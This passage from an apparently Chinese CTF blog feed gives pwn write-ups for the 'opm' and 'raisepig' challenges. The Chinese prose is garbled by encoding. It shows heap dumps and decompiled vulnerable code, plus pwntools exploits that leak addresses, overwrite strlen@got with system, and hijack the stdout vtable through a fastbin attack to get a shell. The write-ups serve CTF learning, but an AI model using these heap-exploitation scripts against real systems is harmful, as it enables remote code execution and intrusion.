class="line">0x55877d5ffdb0:0x00000000000000000x0000000000000091</span><br><span class="line">0x55877d5ffdc0:0x43434343434343430x4343434343434343 ----&gt;role2-&gt;name</span><br><span class="line">0x55877d5ffdd0:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffde0:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffdf0:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffe00:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffe10:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffe20:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffe30:0x43434343434343430x4343434343434343</span><br><span class="line">0x55877d5ffe40:0x00000000000000000x0000000000000031 ----&gt;role3</span><br><span class="line">0x55877d5ffe50:0x000055877c368b300x000055877d5ffe80</span><br><span class="line">0x55877d5ffe60:0x000000000000000e0x0000000000000000</span><br><span class="line">0x55877d5ffe70:0x00000000000000000x0000000000000021</span><br><span class="line">0x55877d5ffe80:0x45454545454545450x000055877d5ffd90 ----&gt;role3-&gt;name # fake role</span><br><span class="line">0x55877d5ffe90:0x00000000000000000x0000000000020171 ----&gt;top chunk</span><br></pre></td></tr></table></figure></p><p>åŒç†å¯ä»¥æ³„æ¼libcåœ°å€ï¼Œç„¶ååˆ©ç”¨ç¬¬äºŒä¸ªæº¢å‡ºç‚¹è¦†ç›–v6ä¸ºstrlen@gotåœ°å€ï¼Œé€šè¿‡å†™å…¥punch numä¿®æ”¹ä½8ä½åœ°å€ä¸ºsystemåœ°å€æˆ–è€…onegadgetåœ°å€ã€‚<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./opm'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,n)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'(E)'</span>,<span class="string">'A'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'name:'</span>,name)</span><br><span class="line">    p.recvuntil(<span class="string">'punch?'</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">    p.sendline(str(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'(E)'</span>,<span class="string">'S'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./opm'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">add(<span class="string">'A'</span>*<span class="number">0x70</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="string">'B'</span>*<span class="number">0x80</span>+<span class="string">'\x10'</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="string">'C'</span>*<span class="number">0x80</span>,<span class="string">'3'</span>+<span class="string">'D'</span>*<span class="number">0x7f</span>+<span class="string">'\x10'</span>)</span><br><span class="line"><span class="comment"># leak heap addr</span></span><br><span class="line">p.recvuntil(<span class="string">'B'</span>*<span class="number">8</span>)</span><br><span class="line">heap = u64((p.recvuntil(<span class="string">'&gt;'</span>,drop=<span class="keyword">True</span>)).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(hex(heap))</span><br><span class="line"><span class="comment"># leak elf base</span></span><br><span class="line">add(<span class="string">'E'</span>*<span class="number">8</span>+p64(heap<span class="number">-0x30</span>),str(<span class="number">131441</span>).ljust(<span class="number">0x80</span>,<span class="string">'F'</span>)+p64(heap+<span class="number">0xc0</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&lt;'</span>)</span><br><span class="line">func = u64((p.recvuntil(<span class="string">'&gt;'</span>,drop=<span class="keyword">True</span>)).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">elf.address = func<span class="number">-0xb30</span></span><br><span class="line">success(hex(elf.address)) </span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">add(<span class="string">'G'</span>*<span class="number">8</span>+p64(elf.got[<span class="string">'strlen'</span>]),str(<span class="number">131441</span><span class="number">-0x30</span><span class="number">-0x20</span>).ljust(<span class="number">0x80</span>,<span class="string">'H'</span>)+p64(heap+<span class="number">0xc0</span>+<span class="number">0x30</span>+<span class="number">0x20</span>))</span><br><span class="line">p.recvuntil(<span class="string">'&lt;'</span>)</span><br><span class="line">strlen_addr = u64((p.recvuntil(<span class="string">'&gt;'</span>,drop=<span class="keyword">True</span>)).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address = strlen_addr - libc.symbols[<span class="string">'strlen'</span>]</span><br><span class="line">success(hex(libc.address))</span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">add(<span class="string">'I'</span>*<span class="number">0x10</span>,str(libc.symbols[<span class="string">'system'</span>]&amp;<span class="number">0xffffffff</span>).ljust(<span class="number">0x80</span>,<span class="string">'J'</span>)+p64(elf.got[<span class="string">'strlen'</span>]<span class="number">-0x18</span>))</span><br><span class="line">add(<span class="string">'/bin/sh\x00'</span>,<span class="string">'5'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>åæ¥å‘ç°fake roleå‘å‰ç§»0x8å°±ä¸ä¼šç ´åtop chunkï¼Œä¿®æ”¹å¦‚ä¸‹ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak elf addr</span></span><br><span class="line">add(p64(heap<span class="number">-0x30</span>),<span class="string">''</span>.ljust(<span class="number">0x80</span>,<span class="string">'F'</span>)+p64(heap+<span class="number">0xc0</span><span class="number">-0x8</span>))</span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">add(p64(elf.got[<span class="string">'strlen'</span>]),<span class="string">''</span>.ljust(<span class="number">0x80</span>,<span class="string">'H'</span>)+p64(heap+<span class="number">0xc0</span>+<span class="number">0x30</span>+<span class="number">0x20</span><span class="number">-0x8</span>))</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;opm&quot;&gt;&lt;a href=&quot;#opm&quot; class=&quot;headerlink&quot; title=&quot;opm&quot;&gt;&lt;/a&gt;opm&lt;/h3&gt;&lt;p&gt;é¦–å…ˆå­¦ä¹ ä¸€ä¸‹åœ¨IDAåˆ›å»ºç»“æ„ä½“ï¼Œ&lt;a href=&quot;https://blog.csdn.net/hgy413/article/deta
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>qwb-pwn-raisepig</title>
    <link href="https://4f-kira.github.io/2018/04/12/qwb-pwn-raisepig/"/>
    <id>https://4f-kira.github.io/2018/04/12/qwb-pwn-raisepig/</id>
    <published>2018-04-12T08:32:54.000Z</published>
    <updated>2018-04-12T08:42:42.239Z</updated>
    
    <content type="html"><![CDATA[<h3 id="raisepig"><a href="#raisepig" class="headerlink" title="raisepig"></a>raisepig</h3><p>è·Ÿpwnable.twçš„Secret Gardenéå¸¸ä¼¼ã€‚èœå•æœ‰5ä¸ªé€‰é¡¹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;1 . Raise a pig &quot;);</span><br><span class="line">puts(&quot;2 . Visit pigs &quot;);</span><br><span class="line">puts(&quot;3 . Eat a pig&quot;);</span><br><span class="line">puts(&quot;4 . Eat the whole Pig Farm&quot;);</span><br><span class="line">puts(&quot;5 . Leave the Farm&quot;);</span><br></pre></td></tr></table></figure></p><p>IDAä¸­å»ºä¸€ä¸ªpigçš„ç»“æ„ä½“ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000 pigs            struc ; (sizeof=0x28, mappedto_6)</span><br><span class="line">00000000 inuse           dq ?</span><br><span class="line">00000008 name            dq ?</span><br><span class="line">00000010 type            dq 3 dup(?)</span><br><span class="line">00000028 pigs            ends</span><br></pre></td></tr></table></figure><p>æ¼æ´ç‚¹åœ¨<code>Eat a pig</code>ï¼Œinuseä½æ¸…0ï¼Œfreeæ‰nameï¼Œåœ¨freeå‰ä»…ä»…æ£€æŸ¥äº†pig_listæ˜¯å¦å­˜åœ¨ï¼Œå¹¶ä¸”æ²¡æœ‰åœ¨freeåå¯¹æŒ‡é’ˆè¿›è¡Œæ¸…ç©ºï¼Œå­˜åœ¨UAFï¼Œå¯ä»¥double freeã€‚<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">eat_one</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( pig_num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Which pig do you want to eat:"</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0x63</span> || !pig_list[v1] )           <span class="comment">// æ²¡æœ‰æ£€æŸ¥inuse</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    srand(<span class="number">0</span>);</span><br><span class="line">    LODWORD(pig_list[v1]-&gt;inuse) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)pig_list[v1]-&gt;name);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No pig"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>Eat the whole Pig Farm</code>ä¼šfreeæ‰æ‰€æœ‰è¿˜å­˜åœ¨çš„pigï¼Œå¹¶ä¸”pig_listä¸­æŒ‡é’ˆæ¸…é›¶ã€‚<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x63</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( pig_list[i] &amp;&amp; !LODWORD(pig_list[i]-&gt;inuse) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(pig_list[i]);</span><br><span class="line">    pig_list[i] = <span class="number">0L</span>L;</span><br><span class="line">    --pig_num;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>é¦–å…ˆè¦æ³„éœ²å‡ºlibcçš„åœ°å€ï¼Œåˆ†é…ä¸€ä¸ªæ»¡è¶³unsortedbinå¤§å°çš„chunkï¼Œç„¶åfreeæ‰ï¼Œç„¶åå†ç”³è¯·ä¸€ä¸ªåŒæ ·å¤§å°çš„å †ï¼Œç”±äºæ˜¯ç”¨readè¯»å…¥çš„ï¼Œè¾“å…¥ç»“æŸæ²¡æœ‰<code>\x00</code>ï¼Œnameå¡«æ»¡8å­—èŠ‚ï¼Œæ‰“å°çš„æ—¶å€™å°±ä¼šæŠŠåé¢bkçš„å†…å®¹æ‰“å°å‡ºæ¥ã€‚ä¹‹åå¯ä»¥è€ƒè™‘ä½¿ç”¨fastbin attackæ”¹å†™<code>__malloc_hook</code>æˆ–è€…<code>__free_hook</code>ä¸ºone gadgetã€‚</p><p><code>__malloc_hook</code>é™„è¿‘æ‰¾åˆ°ä¸€ä¸ª0x70å¤§å°çš„ä½ç½®ï¼Œç„¶è€Œæœ¬é¢˜ç¯å¢ƒä½¿ç”¨mallocæ˜¯æ²¡æ³•è¾¾åˆ°one gadgetæ‰§è¡Œéœ€æ±‚ã€‚é‡å¤<code>free</code>åŒä¸€ä¸ªå†…å­˜èƒ½è§¦å‘<code>malloc_printerr</code>, å¹¶è°ƒç”¨<code>malloc</code>ã€‚ç„¶è€Œè§¦å‘<code>malloc_printerr</code>æˆ–ç›´æ¥è°ƒç”¨<code>malloc</code>éƒ½getshellå¤±è´¥ã€‚</p><p>å¯è¡Œå§¿åŠ¿ä¸ºï¼šåˆ©ç”¨fastbin attackæ”»å‡»<code>Stdout</code>çš„fileç»“æ„<code>_IO_2_1_stdout_</code>ï¼Œæ›´æ”¹<code>stdout</code>çš„<code>vtable</code>æŒ‡å‘one_gadgetã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_2_1_stdout_</span><br><span class="line">$1 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537977, </span><br><span class="line">    _IO_read_ptr = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_end = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_base = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_base = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_end = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_end = 0x7f23b5af66a4 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x7f23b5af58e0 &lt;_IO_2_1_stdin_&gt;, </span><br><span class="line">    _fileno = 1, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = -1, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;\n&quot;, </span><br><span class="line">    _lock = 0x7f23b5af7780 &lt;_IO_stdfile_1_lock&gt;, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7f23b5af57a0 &lt;_IO_wide_data_1&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7f23b5af46e0 &lt;_IO_file_jumps&gt;  &lt;-- ä¿®æ”¹è¿™é‡ŒæŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„vtable</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>&lt;_IO_file_jumps&gt;</code>åœ¨<code>0x7f23b5af66f8</code>å¤„<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> x/32a 0x7f23b5af6620</span><br><span class="line">0x7f23b5af6620 &lt;_IO_2_1_stdout_&gt;:0xfbad28870x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;</span><br><span class="line">0x7f23b5af6630 &lt;_IO_2_1_stdout_+16&gt;:0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;</span><br><span class="line">0x7f23b5af6640 &lt;_IO_2_1_stdout_+32&gt;:0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;</span><br><span class="line">0x7f23b5af6650 &lt;_IO_2_1_stdout_+48&gt;:0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;0x7f23b5af66a3 &lt;_IO_2_1_stdout_+131&gt;</span><br><span class="line">0x7f23b5af6660 &lt;_IO_2_1_stdout_+64&gt;:0x7f23b5af66a4 &lt;_IO_2_1_stdout_+132&gt;0x0</span><br><span class="line">0x7f23b5af6670 &lt;_IO_2_1_stdout_+80&gt;:0x00x0</span><br><span class="line">0x7f23b5af6680 &lt;_IO_2_1_stdout_+96&gt;:0x00x7f23b5af58e0 &lt;_IO_2_1_stdin_&gt;</span><br><span class="line">0x7f23b5af6690 &lt;_IO_2_1_stdout_+112&gt;:0x10xffffffffffffffff</span><br><span class="line">0x7f23b5af66a0 &lt;_IO_2_1_stdout_+128&gt;:0xa0000000x7f23b5af7780 &lt;_IO_stdfile_1_lock&gt;</span><br><span class="line">0x7f23b5af66b0 &lt;_IO_2_1_stdout_+144&gt;:0xffffffffffffffff0x0</span><br><span class="line">0x7f23b5af66c0 &lt;_IO_2_1_stdout_+160&gt;:0x7f23b5af57a0 &lt;_IO_wide_data_1&gt;0x0</span><br><span class="line">0x7f23b5af66d0 &lt;_IO_2_1_stdout_+176&gt;:0x00x0</span><br><span class="line">0x7f23b5af66e0 &lt;_IO_2_1_stdout_+192&gt;:0xffffffff0x0</span><br><span class="line">0x7f23b5af66f0 &lt;_IO_2_1_stdout_+208&gt;:0x00x7f23b5af46e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">0x7f23b5af6700 &lt;stderr&gt;:0x7f23b5af6540 &lt;_IO_2_1_stderr_&gt;0x7f23b5af6620 &lt;_IO_2_1_stdout_&gt;</span><br><span class="line">0x7f23b5af6710 &lt;stdin&gt;:0x7f23b5af58e0 &lt;_IO_2_1_stdin_&gt;0x7f23b5751b70 &lt;__gcc_personality_v0&gt;</span><br></pre></td></tr></table></figure></p><p>å¾ˆå¥½å½©ï¼Œåœ¨<code>_IO_2_1_stdout_+0x9d</code>å¤„æœ‰å¯åˆ©ç”¨ä½ç½®</p><p><code>IO_jump_t</code>ä¸­ä¿å­˜äº†ä¸€äº›å‡½æ•°æŒ‡é’ˆï¼Œæ ‡å‡†IOå‡½æ•°ä¸­ä¼šè°ƒç”¨è¿™äº›å‡½æ•°æŒ‡é’ˆï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> * funcs[] = &#123;</span><br><span class="line">   <span class="number">1</span> <span class="literal">NULL</span>, <span class="comment">// "extra word"</span></span><br><span class="line">   <span class="number">2</span> <span class="literal">NULL</span>, <span class="comment">// DUMMY</span></span><br><span class="line">   <span class="number">3</span> <span class="built_in">exit</span>, <span class="comment">// finish</span></span><br><span class="line">   <span class="number">4</span> <span class="literal">NULL</span>, <span class="comment">// overflow</span></span><br><span class="line">   <span class="number">5</span> <span class="literal">NULL</span>, <span class="comment">// underflow</span></span><br><span class="line">   <span class="number">6</span> <span class="literal">NULL</span>, <span class="comment">// uflow</span></span><br><span class="line">   <span class="number">7</span> <span class="literal">NULL</span>, <span class="comment">// pbackfail</span></span><br><span class="line">   <span class="number">8</span> <span class="literal">NULL</span>, <span class="comment">// xsputn  #printf</span></span><br><span class="line">   <span class="number">9</span> <span class="literal">NULL</span>, <span class="comment">// xsgetn</span></span><br><span class="line">   <span class="number">10</span> <span class="literal">NULL</span>, <span class="comment">// seekoff</span></span><br><span class="line">   <span class="number">11</span> <span class="literal">NULL</span>, <span class="comment">// seekpos</span></span><br><span class="line">   <span class="number">12</span> <span class="literal">NULL</span>, <span class="comment">// setbuf</span></span><br><span class="line">   <span class="number">13</span> <span class="literal">NULL</span>, <span class="comment">// sync</span></span><br><span class="line">   <span class="number">14</span> <span class="literal">NULL</span>, <span class="comment">// doallocate</span></span><br><span class="line">   <span class="number">15</span> <span class="literal">NULL</span>, <span class="comment">// read</span></span><br><span class="line">   <span class="number">16</span> <span class="literal">NULL</span>, <span class="comment">// write</span></span><br><span class="line">   <span class="number">17</span> <span class="literal">NULL</span>, <span class="comment">// seek</span></span><br><span class="line">   <span class="number">18</span> pwn,  <span class="comment">// close</span></span><br><span class="line">   <span class="number">19</span> <span class="literal">NULL</span>, <span class="comment">// stat</span></span><br><span class="line">   <span class="number">20</span> <span class="literal">NULL</span>, <span class="comment">// showmanyc</span></span><br><span class="line">   <span class="number">21</span> <span class="literal">NULL</span>, <span class="comment">// imbue</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><code>printf</code>æ˜¯é€šè¿‡<code>_IO_file_xsputn</code>å®ç°çš„ï¼Œ<code>fake_vtable[7]</code>æ”¾å…¥one_gadgetï¼Œè°ƒç”¨<code>printf</code>çš„æ—¶å€™å°±å¯ä»¥getshellã€‚ä¸‹é¢å¼€å§‹æ„é€ payloadï¼š<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> x/32gx 0x7f23b5af6620+0x9d+3</span><br><span class="line">0x7f23b5af66c0 &lt;_IO_2_1_stdout_+160&gt;:0x00007f23b5af57a00x0000000000000000</span><br><span class="line">0x7f23b5af66d0 &lt;_IO_2_1_stdout_+176&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f23b5af66e0 &lt;_IO_2_1_stdout_+192&gt;:0x00000000ffffffff0x0000000000000000</span><br><span class="line">0x7f23b5af66f0 &lt;_IO_2_1_stdout_+208&gt;:0x00000000000000000x00007f23b5af46e0 --&gt; vtable</span><br></pre></td></tr></table></figure></p><p>æ„é€ å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*3 + p64(0)*2 + p64(0xffffffff) + p64(0)*2 + p64(fake_vtable)</span><br></pre></td></tr></table></figure></p><p>ç”±äºæ²¡æœ‰æ³„éœ²heapåœ°å€ï¼Œç›´æ¥åˆ©ç”¨æœ¬æ¬¡å†™å…¥one gadgetåˆ°<code>&lt;_IO_2_1_stdout_+208&gt;</code>ï¼Œé‚£ä¹ˆ<code>fake_vtable</code>åœ°å€ä¸º<code>&lt;_IO_2_1_stdout_+208-7*8&gt;</code></p><p>EXP:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./raisepig2'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./raisepig2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">gdb.attach(p,a)</span><br><span class="line"><span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(namelen,name,pigtype,shell=<span class="number">0</span>)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice : '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Length of the name :'</span>,str(namelen))</span><br><span class="line">p.sendafter(<span class="string">'The name of pig :'</span>,name)</span><br><span class="line"><span 